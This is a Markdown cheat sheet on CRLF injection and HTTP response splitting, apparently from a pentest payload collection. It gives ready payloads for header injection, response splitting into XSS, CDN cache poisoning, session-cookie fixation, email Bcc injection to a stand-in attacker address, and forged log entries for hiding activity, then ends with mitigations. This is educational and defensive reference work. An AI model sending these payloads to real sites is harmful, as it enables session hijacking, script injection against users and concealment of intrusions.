# CRLF Injection / HTTP Response Splitting

> CRLF Injection is the insertion of `\r\n` (carriage return + line feed) sequences into HTTP headers, allowing an attacker to inject new headers or even a full response body.

## Summary

- [Detection](#detection)
- [Encoded CRLF](#encoded-crlf)
- [Header Injection](#header-injection)
- [Response Splitting → XSS](#response-splitting--xss)
- [Cache Poisoning](#cache-poisoning)
- [Cookie Injection / Fixation](#cookie-injection--fixation)
- [Email Header Injection](#email-header-injection)
- [Log Injection](#log-injection)
- [Mitigation](#mitigation)
- [References](#references)

## Detection

Inject CR (`\r`, `%0d`), LF (`\n`, `%0a`), or both into reflected parameters that end up in headers (e.g. `Location:`, `Set-Cookie:`, custom headers).

```
%0d%0aHeader-Injected:%20yes
```

Look at the response — does a new header line appear?

## Encoded CRLF

| Form | %-encoded | Double-encoded | Unicode |
|------|-----------|----------------|---------|
| CR   | `%0d` | `%250d` | `%u000d` / `%u560d` (bypass) |
| LF   | `%0a` | `%250a` | `%u000a` / `%u560a` |
| CRLF | `%0d%0a` | `%250d%250a` | `%u000d%u000a` |

Other forms occasionally accepted:

```
%E5%98%8A%E5%98%8D       (Unicode "smuggled" CRLF — historical IIS bug)

              (in JSON contexts)
\x0d\x0a
```

## Header Injection

If parameter reflects into a response header:

```
GET /?lang=en%0d%0aX-Injected:%20yes HTTP/1.1
```

→ Response:

```
Location: /en
X-Injected: yes
```

## Response Splitting → XSS

When the reflection is uncontrolled, you can terminate headers and inject a body:

```
?next=/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>
```

Modern servers (Apache, nginx, Node, most frameworks) reject `\r` / `\n` in header values now, so this is mostly only viable in:

- Legacy stacks
- Custom proxy / SDK code
- Misconfigured WAF that decodes but the upstream doesn't

## Cache Poisoning

If a CDN caches by URL only and you inject a response, every subsequent user requesting that URL gets your forged response.

```
GET /api?cb=valid%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

## Cookie Injection / Fixation

```
?lang=en%0d%0aSet-Cookie:%20session=attacker_chosen
```

After redirect, the victim has the attacker's session cookie (fixation).

## Email Header Injection

When a contact form sends `Subject:` / `To:` headers based on input:

```
subject=Hello%0d%0aBcc:%20attacker@evil.tld
```

The attacker silently receives a copy. Variants:

```
%0d%0aBcc: ...
%0d%0aCc: ...
%0d%0aContent-Type: multipart/mixed; boundary=...
%0d%0aSubject: Spoofed
%0d%0aFrom: spoofed@target.tld
```

## Log Injection

LF injects forge log entries:

```
?user=admin%0afake_entry:%20user%20'admin'%20logged%20in%20from%20127.0.0.1
```

Useful for breaking SIEM searches or hiding malicious activity.

### Terminal escape sequences

Logs viewed in a terminal:

```
%1b[2J%1b[H        clears the screen
%1b]2;evil%07      changes terminal title (some terminals)
```

## Mitigation

- **Reject** any user input destined for a header that contains `\r`, `\n`, NUL, or other control bytes.
- Use HTTP libraries that **enforce header validation** (most modern ones do).
- Encode log values; structured logging (JSON) is naturally safe.
- For email, use libraries that take parameters separately (`To`, `Subject`) and serialize safely.

## References

- [OWASP — CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- [PortSwigger — HTTP Response Splitting](https://portswigger.net/kb/issues/00200200_http-response-header-injection)
